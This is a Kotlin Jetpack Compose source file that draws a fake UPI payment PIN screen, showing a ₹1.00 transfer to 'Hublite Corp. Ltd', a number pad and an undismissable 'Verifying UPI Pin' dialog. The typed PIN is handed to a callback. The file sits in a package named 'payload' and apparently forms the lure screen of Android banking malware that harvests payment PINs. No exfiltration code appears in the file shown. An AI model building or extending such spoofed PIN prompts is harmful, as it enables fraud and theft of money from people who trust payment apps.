package com.payload.jansiix0ne.ui.screens

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Icon
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import com.payload.jansiix0ne.R

@Composable
fun UPIPinScreen(
    amount: String = "₹1.00",
    recipient: String = "Hublite Corp. Ltd",
    onPinEntered: (String) -> Unit,
    onCancel: () -> Unit
) {
    var pin by remember { mutableStateOf("") }
    var isVerifying by remember { mutableStateOf(false) }
    
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
    ) {
        // Top section with transaction details
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0xFFF5F5F5))
                .padding(horizontal = 24.dp, vertical = 20.dp)
        ) {
            // Sending amount
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "Sending:",
                    fontSize = 16.sp,
                    color = Color.Black
                )
                Text(
                    text = amount,
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.Black
                )
            }
            
            Spacer(modifier = Modifier.height(12.dp))
            
            // Recipient
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "To:",
                    fontSize = 16.sp,
                    color = Color.Black
                )
                Text(
                    text = recipient,
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.Black
                )
            }
        }
        
        Spacer(modifier = Modifier.height(32.dp))
        
        // Enter PIN Text
        Text(
            text = "ENTER UPI PIN",
            fontSize = 18.sp,
            fontWeight = FontWeight.Bold,
            color = Color.Black,
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 24.dp),
            textAlign = TextAlign.Center
        )
        
        Spacer(modifier = Modifier.height(32.dp))
        
        // Info Banner
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 24.dp)
                .clip(RoundedCornerShape(24.dp))
                .background(Color(0xFFFFF3CD))
                .padding(16.dp)
        ) {
            Row(
                verticalAlignment = Alignment.CenterVertically
            ) {
                Box(
                    modifier = Modifier
                        .size(32.dp)
                        .clip(CircleShape)
                        .background(Color(0xFFFF9800)),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        text = "i",
                        color = Color.White,
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
                Spacer(modifier = Modifier.width(12.dp))
                Text(
                    text = "You are sending $amount from your account to $recipient",
                    fontSize = 14.sp,
                    color = Color.Black,
                    lineHeight = 20.sp
                )
            }
        }
        
        Spacer(modifier = Modifier.weight(1f))
        
        // Number Pad
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0xFFF5F5F5))
                .padding(horizontal = 24.dp, vertical = 20.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Row 1: 1, 2, 3
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                NumberButton("1", onClick = { if (pin.length < 6) pin += "1" })
                NumberButton("2", onClick = { if (pin.length < 6) pin += "2" })
                NumberButton("3", onClick = { if (pin.length < 6) pin += "3" })
            }
            
            // Row 2: 4, 5, 6
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                NumberButton("4", onClick = { if (pin.length < 6) pin += "4" })
                NumberButton("5", onClick = { if (pin.length < 6) pin += "5" })
                NumberButton("6", onClick = { if (pin.length < 6) pin += "6" })
            }
            
            // Row 3: 7, 8, 9
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                NumberButton("7", onClick = { if (pin.length < 6) pin += "7" })
                NumberButton("8", onClick = { if (pin.length < 6) pin += "8" })
                NumberButton("9", onClick = { if (pin.length < 6) pin += "9" })
            }
            
            // Row 4: Delete, 0, Confirm
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                DeleteButton(onClick = { if (pin.isNotEmpty()) pin = pin.dropLast(1) })
                NumberButton("0", onClick = { if (pin.length < 6) pin += "0" })
                ConfirmButton(
                    onClick = {
                        if (pin.length == 4 || pin.length == 6) {
                            android.util.Log.d("UPIPinScreen", "✅ PIN entered: ${pin.length} digits")
                            isVerifying = true
                            onPinEntered(pin)
                        } else {
                            android.util.Log.w("UPIPinScreen", "⚠️ Invalid PIN length: ${pin.length} (must be 4 or 6)")
                        }
                    }
                )
            }
        }
    }
    
    // Verifying Dialog
    if (isVerifying) {
        Dialog(onDismissRequest = {}) {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(24.dp))
                    .background(Color.White)
                    .padding(32.dp),
                contentAlignment = Alignment.Center
            ) {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    CircularProgressIndicator(
                        modifier = Modifier.size(48.dp),
                        color = Color(0xFF4CAF50)
                    )
                    Spacer(modifier = Modifier.height(24.dp))
                    Text(
                        text = "Verifying UPI Pin",
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color.Black
                    )
                }
            }
        }
    }
}

@Composable
fun NumberButton(
    number: String,
    onClick: () -> Unit
) {
    Button(
        onClick = onClick,
        modifier = Modifier.size(80.dp),
        shape = CircleShape,
        colors = ButtonDefaults.buttonColors(
            containerColor = Color.Transparent,
            contentColor = Color(0xFF1A237E)
        ),
        elevation = ButtonDefaults.buttonElevation(0.dp)
    ) {
        Text(
            text = number,
            fontSize = 28.sp,
            fontWeight = FontWeight.Normal,
            color = Color(0xFF1A237E)
        )
    }
}

@Composable
fun DeleteButton(onClick: () -> Unit) {
    Button(
        onClick = onClick,
        modifier = Modifier.size(80.dp),
        shape = CircleShape,
        colors = ButtonDefaults.buttonColors(
            containerColor = Color(0xFF1A237E),
            contentColor = Color.White
        )
    ) {
        Text(
            text = "×",
            fontSize = 32.sp,
            fontWeight = FontWeight.Normal,
            color = Color.White
        )
    }
}

@Composable
fun ConfirmButton(onClick: () -> Unit) {
    Button(
        onClick = onClick,
        modifier = Modifier.size(80.dp),
        shape = CircleShape,
        colors = ButtonDefaults.buttonColors(
            containerColor = Color(0xFF1A237E),
            contentColor = Color.White
        )
    ) {
        Text(
            text = "✓",
            fontSize = 32.sp,
            fontWeight = FontWeight.Bold,
            color = Color.White
        )
    }
}
